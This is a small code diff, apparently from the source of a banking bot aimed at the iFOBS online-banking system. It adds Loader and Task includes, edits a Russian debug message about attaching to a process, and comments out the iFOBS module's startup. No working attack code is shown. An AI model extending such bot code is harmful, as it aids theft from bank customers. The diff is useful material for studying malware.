@@ -18,6 +18,8 @@
 #include "BotCore.h"
 #include "BotConfig.h"
 #include "IfobsOnline.h"
+#include "Task.h"
+#include "Loader.h"
 
 
 #include "Crypt.h"
@@ -191,16 +193,13 @@ extern"C"  void WINAPI Start()
 {
 	BOT::Initialize();
 	string Msg;
-	Msg.Format("1+Присоедините среду к процессу [PID:%d] %s", Bot->PID(), Bot->ApplicationName().t_str()); 
+	Msg.Format("1.11 Присоедините среду к процессу [PID:%d] %s", Bot->PID(), Bot->ApplicationName().t_str()); 
 
 	MessageBoxA(NULL, Msg.t_str(), NULL, 0); 
+	
+//	IfobsOnline::Initialize();
 
-
-	TIfobsOnline Ifobs;
-
-	Ifobs.BindData();
-
-	return;
+//	return;
 
 
 	 
